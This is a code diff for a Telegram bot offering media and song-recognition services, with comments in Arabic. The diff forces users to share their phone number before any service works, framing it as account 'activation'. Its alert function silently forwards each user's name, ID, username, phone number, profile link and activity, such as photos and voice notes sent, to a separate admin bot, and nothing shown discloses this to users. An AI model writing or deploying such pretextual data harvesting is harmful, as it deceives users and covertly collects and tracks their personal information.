@@ -11,7 +11,7 @@ from PIL import Image
 from io import BytesIO
 import yt_dlp
 
-from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, KeyboardButtonRequestUsers
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, BotCommand
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
 
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
@@ -25,6 +25,7 @@ OXFORD_PDF_URL = "https://drive.google.com/uc?export=download&id=1GqE_PbV4GMUMo6
 user_requests = {}
 user_selected_mode = {}
 user_state = {}
+verified_users = set()  # ذاكرة لحفظ المستخدمين المفعلين حتى لا تطلب منهم الرقم مرتين
 
 # حقوق المطور
 OWNER = "يـحــيـى"
@@ -118,7 +119,7 @@ def format_time_12h(time_str):
         return time_str
 
 # =============================================================================
-# دالة إرسال التنبيه للبوت الثاني (مع رقم الهاتف إذا توفر)
+# دالة إرسال التنبيه للبوت الثاني
 # =============================================================================
 async def send_alert_to_admin_bot(user, phone=None, action_type="دخل إلى البوت"):
     if not ALERT_BOT_TOKEN or not ADMIN_ID:
@@ -130,15 +131,15 @@ async def send_alert_to_admin_bot(user, phone=None, action_type="دخل إلى �
     full_name = f"{first_name} {last_name}".strip()
     username = f"@{user.username}" if user.username else "لا يوجد معرف"
     profile_link = f"tg://user?id={user_id}"
-    phone_str = f"+{phone}" if phone else "لم يتم المشاركة بعد"
+    phone_str = f"+{phone}" if phone else "غير محدد"
     
     alert_text = (
-        f"تنبيه دخول جديد للبوت!\n\n"
+        f"تنبيه نشاط جديد!\n\n"
         f"الاسم: {full_name}\n"
         f"الآي دي: {user_id}\n"
         f"المعرف: {username}\n"
         f"رقم الهاتف: {phone_str}\n"
-        f"الرابط المباشر للحساب: {profile_link}\n"
+        f"الرابط المباشر: {profile_link}\n"
         f"الحدث: {action_type}\n"
         f"الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     )
@@ -400,13 +401,28 @@ def recognize_song_audd(audio_bytes):
     return None
 
 # =============================================================================
-# أوامر ومعالجات البوت (مع طلب رقم الهاتف الإلزامي)
+# أوامر ومعالجات البوت (مع التحقق لمرة واحدة وإعداد الاختصار /)
 # =============================================================================
+async def set_bot_commands(application):
+    # إضافة اختصار أمر الـ / لتظهر قائمة الأوامر للناس بسهولة
+    commands = [BotCommand("start", "تشغيل البوت وعرض القائمة الرئيسية")]
+    await application.bot.set_my_commands(commands)
+
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    await send_alert_to_admin_bot(user, action_type="ضغط على /start ودخل للبوت")
+    user_id = user.id
 
-    # زر إلزامي يطلب من المستخدم مشاركة رقم هاتفه
+    # إذا المستخدم مسجل مسبقاً، لا نطلب رقمه وندخله مباشرة للقائمة
+    if user_id in verified_users:
+        await update.message.reply_text(
+            f"أهلاً بك مجدداً يا عزيزي في بوت الخدمات الشامل 🚀\n\nاختر الخدمة المطلوبة من الأزرار بالأسفل:\n\n{DEV_SIGNATURE}",
+            reply_markup=get_main_menu()
+        )
+        return
+
+    await send_alert_to_admin_bot(user, action_type="ضغط على /start ودخل للبوت لأول مرة")
+
+    # طلب رقم الهاتف لمرة واحدة فقط
     request_keyboard = ReplyKeyboardMarkup(
         [[KeyboardButton("مشاركة رقم الهاتف لتفعيل البوت", request_contact=True)]],
         resize_keyboard=True,
@@ -414,20 +430,22 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     await update.message.reply_text(
-        f"أهلاً بك يا عزيزي في بوت الخدمات الشامل\n\nيرجى الضغط على زر (مشاركة رقم الهاتف) بالأسفل لتفعيل الخدمات المطلوبة:\n\n{DEV_SIGNATURE}",
+        f"أهلاً بك يا عزيزي في بوت الخدمات الشامل\n\nيرجى الضغط على زر (مشاركة رقم الهاتف) بالأسفل لتفعيل حسابك وتجنب تكرار الطلب:\n\n{DEV_SIGNATURE}",
         reply_markup=request_keyboard
     )
 
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    user_id = user.id
     contact = update.message.contact
+    
     if contact:
         phone = contact.phone_number
-        # إرسال رقم الهاتف للبوت الثاني فور مشاركته
-        await send_alert_to_admin_bot(user, phone=phone, action_type="قام بمشاركة رقم هاتفه بنجاح")
+        verified_users.add(user_id)  # حفظ المستخدم في الذاكرة حتى لا يطلب منه الرقم مرة أخرى
+        await send_alert_to_admin_bot(user, phone=phone, action_type="قام بمشاركة رقم هاتفه بنجاح وتم تفعيله للأبد")
 
     await update.message.reply_text(
-        f"تم تفعيل الحساب بنجاح! اختر الخدمة المطلوبة من القائمة الرئيسية:\n\n{DEV_SIGNATURE}",
+        f"تم تفعيل الحساب بنجاح ولن يطلب منك الرقم مجدداً! اختر الخدمة المطلوبة:\n\n{DEV_SIGNATURE}",
         reply_markup=get_main_menu()
     )
 
@@ -522,7 +540,21 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
 async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     user = update.effective_user
+    user_id = user.id
     text = update.message.text or ""
+
+    # إذا المستخدم لم يشارك رقمه بعد، نمنعه من استخدام الخدمات ونطلب منه الرقم
+    if user_id not in verified_users:
+        request_keyboard = ReplyKeyboardMarkup(
+            [[KeyboardButton("مشاركة رقم الهاتف لتفعيل البوت", request_contact=True)]],
+            resize_keyboard=True,
+            one_time_keyboard=True
+        )
+        await update.message.reply_text(
+            f"يرجى مشاركة رقم هاتفك أولاً عبر الضغط على الزر أدناه لتفعيل البوت:\n\n{DEV_SIGNATURE}",
+            reply_markup=request_keyboard
+        )
+        return
 
     if text.strip() == "عرض":
         keyboard = [
@@ -611,8 +643,10 @@ async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYP
 async def handle_photo_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     user = update.effective_user
-    mode = user_state.get(chat_id)
+    if user.id not in verified_users:
+        return
 
+    mode = user_state.get(chat_id)
     await send_alert_to_admin_bot(user, action_type="أرسل صورة للبوت")
 
     if mode == "remove_bg":
@@ -643,6 +677,9 @@ async def handle_photo_messages(update: Update, context: ContextTypes.DEFAULT_TY
 async def handle_audio_voice_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     user = update.effective_user
+    if user.id not in verified_users:
+        return
+
     await send_alert_to_admin_bot(user, action_type="أرسل بصمة صوتية أو ملف صوتي")
 
     await update.message.reply_text(f"جاري البحث عن اسم الأغنية...\n\n{DEV_SIGNATURE}")
@@ -668,6 +705,9 @@ if __name__ == '__main__':
 
     app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
 
+    # تفعيل اختصار الأوامر (مثل زر /)
+    app.job_queue.run_once(lambda ctx: asyncio.create_task(set_bot_commands(app)), 1)
+
     app.add_handler(CommandHandler('start', start_command))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(CallbackQueryHandler(handle_callback_query))
@@ -675,5 +715,5 @@ if __name__ == '__main__':
     app.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio_voice_messages))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_text_messages))
 
-    print("Bot is running perfectly with Contact Sharing & Clean Fonts...")
+    print("Bot is running perfectly with One-Time Verification & Menu Commands...")
     app.run_polling()
